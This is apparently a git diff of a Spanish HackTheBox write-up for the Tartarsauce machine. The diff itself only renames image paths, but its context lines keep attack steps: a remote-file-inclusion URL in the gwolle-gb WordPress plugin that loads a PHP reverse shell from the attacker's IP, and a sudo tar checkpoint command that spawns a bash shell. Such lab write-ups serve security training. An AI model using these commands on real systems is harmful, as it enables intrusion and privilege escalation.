@@ -3,7 +3,7 @@ title: "Tartarsauce - WriteUp"
 date: Thu Jan 30 2025 13:15:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, dirb, wordpress, exploit, gobuster, bash, privesc, php]
-image: /assets/img/htb-writeups/Pasted image 20240213110350.png
+image: /assets/img/htb-writeups/Pasted-image-20240213110350.png
 ---
 
 {% include machine-info.html
@@ -13,14 +13,14 @@ image: /assets/img/htb-writeups/Pasted image 20240213110350.png
   platform="HTB"
 %}
 
-![Tartarsauce](/assets/img/htb-writeups/Pasted image 20240213110350.png)
+![Tartarsauce](/assets/img/htb-writeups/Pasted-image-20240213110350.png)
 
 ---
 
 ---
 ------
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213110350.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213110350.png)
 
 Acerca de la salsa tártara
 
@@ -55,7 +55,7 @@ PORT   STATE SERVICE VERSION
 |_/webservices/developmental/ /webservices/phpmyadmin/
 ```
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213111714.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213111714.png)
 
 ROBOTS.TXT
 ```HTTP
@@ -67,19 +67,19 @@ Disallow: /webservices/developmental/
 Disallow: /webservices/phpmyadmin/
 ```
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213111925.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213111925.png)
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213112118.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213112118.png)
 
 Probamos con admin/admin y entramos...
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213112312.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213112312.png)
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213112331.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213112331.png)
 
 Con todos estos datos y al estar autenticados vamos a buscar un exploit que nos pueda dar acceso a la máquina.
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213113837.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213113837.png)
 
 Intento unos cuantos exploit más pero parecen no funcionar. Vamosa enumerar más por si encontramos algo que en principio no hemos visto.
 Parece un rabbit hole...
@@ -104,11 +104,11 @@ Descubrimos que tiene una ruta de WordPress, vamos a seguir por esta vía.
 
 Tenemos que añadir el dominio tartarsauce.htb porque el  propio WordPres intenta un redirección.
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213125054.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213125054.png)
 
 Y efectivamente, tenemos un WordPress.
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213125228.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213125228.png)
 
 #### EXPLOTACIÓN
 
@@ -150,7 +150,7 @@ Pues al final sí que tenía plugins, para fiarte de WPSCAN...
 
 Vamos a buscar si podemos explotarlos.
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213133738.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213133738.png)
 
 Tenemos un RFI que consiste en lo siguiente:
 
@@ -168,13 +168,13 @@ Nos ponemos a la escucha por el puerto que hayamos configurado en el archivo PHP
 http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.87/
 ```
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213134907.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213134907.png)
 
 Y padentro... Yo he usado penelope como listener pero se puede usar NetCat tranquilamente...
 
 #### MOVIMIENTO LATERAL
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213135251.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213135251.png)
 
 Vemos que el usuario _onuma_ puede ejecutar como root el binario /bin/tar. Es un vector fácil de explotar.
 
@@ -184,7 +184,7 @@ Vamos a escalar al usuario onuma de la manera que nos ofrece _GTFObins_ https://
 $ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 ```
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213161651.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213161651.png)
 
 Pues ya somo _onuma_...
 
@@ -194,7 +194,7 @@ Registramos bandera y seguimos.
 
 Pasamos el PSPY y nos muestra esto:
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213164839.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213164839.png)
 
 El usuario root ejecuta una tarea con el script o binario _backuperer_ y luego lo borra.
 
@@ -335,7 +335,7 @@ done
 
 Esperamos dos minutos y visualizamos el contenido del archivo /var/backups/onuma_backup_error.txt
 
-![TARTARSAUCE](/assets/img/htb-writeups/Pasted image 20240213192301.png)
+![TARTARSAUCE](/assets/img/htb-writeups/Pasted-image-20240213192301.png)
 
 Máquina conseguida!
 ---
